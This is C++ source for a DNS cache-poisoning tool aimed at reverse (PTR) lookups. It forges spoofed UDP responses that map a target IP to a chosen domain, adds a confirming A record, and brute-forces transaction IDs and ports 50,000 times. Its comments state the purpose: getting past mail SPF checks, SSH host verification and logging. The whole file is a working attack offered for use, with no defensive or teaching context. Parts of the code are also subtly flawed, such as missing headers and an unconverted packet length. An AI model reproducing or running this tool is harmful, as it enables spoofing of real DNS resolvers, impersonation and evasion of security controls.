// Compile: g++ -o ptr_poison ptr_poison.cpp
// Run: sudo ./ptr_poison <target_dns> <target_ip> <spoof_domain>
// Requires: root privileges

#include <iostream>
#include <cstring>
#include <cstdlib>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <unistd.h>

class PTRPoison {
private:
    std::string targetDNS, targetIP, spoofDomain;
    
    int encodeName(char* buf, const std::string& name) {
        int pos = 0;
        size_t start = 0, dot;
        while ((dot = name.find('.', start)) != std::string::npos) {
            int len = dot - start;
            buf[pos++] = len;
            memcpy(buf + pos, name.c_str() + start, len);
            pos += len;
            start = dot + 1;
        }
        int len = name.length() - start;
        buf[pos++] = len;
        memcpy(buf + pos, name.c_str() + start, len);
        pos += len;
        buf[pos++] = 0;
        return pos;
    }
    
    std::string reverseIP(const std::string& ip) {
        // 192.168.1.1 -> 1.1.168.192.in-addr.arpa
        std::string result;
        size_t start = 0, dot;
        std::vector<std::string> parts;
        while ((dot = ip.find('.', start)) != std::string::npos) {
            parts.push_back(ip.substr(start, dot - start));
            start = dot + 1;
        }
        parts.push_back(ip.substr(start));
        
        for (auto it = parts.rbegin(); it != parts.rend(); ++it) {
            result += *it + ".";
        }
        result += "in-addr.arpa";
        return result;
    }
    
public:
    PTRPoison(const std::string& dns, const std::string& ip, 
              const std::string& domain)
        : targetDNS(dns), targetIP(ip), spoofDomain(domain) {}
    
    // Poison PTR record - affects reverse DNS lookups
    // Used to bypass: mail server SPF checks, SSH host verification, logging
    void poisonPTR(uint16_t txid, uint16_t dstPort) {
        int sock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
        int one = 1;
        setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
        
        char packet[1024];
        memset(packet, 0, sizeof(packet));
        
        struct iphdr* ip = (struct iphdr*)packet;
        struct udphdr* udp = (struct udphdr*)(packet + sizeof(struct iphdr));
        char* dns = packet + sizeof(struct iphdr) + sizeof(struct udphdr);
        
        *(uint16_t*)(dns + 0) = htons(txid);
        *(uint16_t*)(dns + 2) = htons(0x8180);
        *(uint16_t*)(dns + 4) = htons(1);
        *(uint16_t*)(dns + 6) = htons(1);  // PTR
        *(uint16_t*)(dns + 8) = htons(0);
        *(uint16_t*)(dns + 10) = htons(1); // Additional A for forward confirmation
        
        int pos = 12;
        
        std::string reverseName = reverseIP(targetIP);
        
        // Question
        pos += encodeName(dns + pos, reverseName);
        *(uint16_t*)(dns + pos) = htons(12); pos += 2;  // PTR
        *(uint16_t*)(dns + pos) = htons(1); pos += 2;
        
        // PTR Answer
        pos += encodeName(dns + pos, reverseName);
        *(uint16_t*)(dns + pos) = htons(12); pos += 2;  // PTR
        *(uint16_t*)(dns + pos) = htons(1); pos += 2;
        *(uint32_t*)(dns + pos) = htonl(604800); pos += 4;
        
        int ptrLenPos = pos;
        pos += 2;
        int ptrStart = pos;
        pos += encodeName(dns + pos, spoofDomain);
        *(uint16_t*)(dns + ptrLenPos) = htons(pos - ptrStart);
        
        // Additional A record: forward confirmation
        pos += encodeName(dns + pos, spoofDomain);
        *(uint16_t*)(dns + pos) = htons(1); pos += 2;  // A
        *(uint16_t*)(dns + pos) = htons(1); pos += 2;
        *(uint32_t*)(dns + pos) = htonl(604800); pos += 4;
        *(uint16_t*)(dns + pos) = htons(4); pos += 2;
        struct in_addr addr;
        inet_aton(targetIP.c_str(), &addr);
        memcpy(dns + pos, &addr.s_addr, 4); pos += 4;
        
        udp->source = htons(53);
        udp->dest = htons(dstPort);
        udp->len = htons(sizeof(struct udphdr) + pos);
        udp->check = 0;
        
        ip->ihl = 5;
        ip->version = 4;
        ip->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + pos;
        ip->ttl = 64;
        ip->protocol = IPPROTO_UDP;
        ip->saddr = inet_addr(targetDNS.c_str());
        ip->daddr = inet_addr(targetDNS.c_str());
        ip->check = 0;
        
        struct sockaddr_in dest;
        dest.sin_family = AF_INET;
        dest.sin_port = htons(dstPort);
        dest.sin_addr.s_addr = inet_addr(targetDNS.c_str());
        
        sendto(sock, packet, ip->tot_len, 0, (struct sockaddr*)&dest, sizeof(dest));
        close(sock);
    }
    
    void run(int attempts) {
        std::cout << "[*] PTR record poisoning\n";
        std::cout << "[*] Target IP: " << targetIP << " -> " << spoofDomain << "\n";
        
        for (int i = 0; i < attempts; i++) {
            uint16_t txid = rand() & 0xFFFF;
            uint16_t port = 1024 + (rand() % 64000);
            poisonPTR(txid, port);
        }
    }
};

int main(int argc, char* argv[]) {
    if (argc != 4) {
        std::cerr << "Usage: " << argv[0] 
                  << " <dns> <target_ip> <spoof_domain>\n";
        return 1;
    }
    srand(time(NULL));
    PTRPoison poison(argv[1], argv[2], argv[3]);
    poison.run(50000);
    return 0;
}
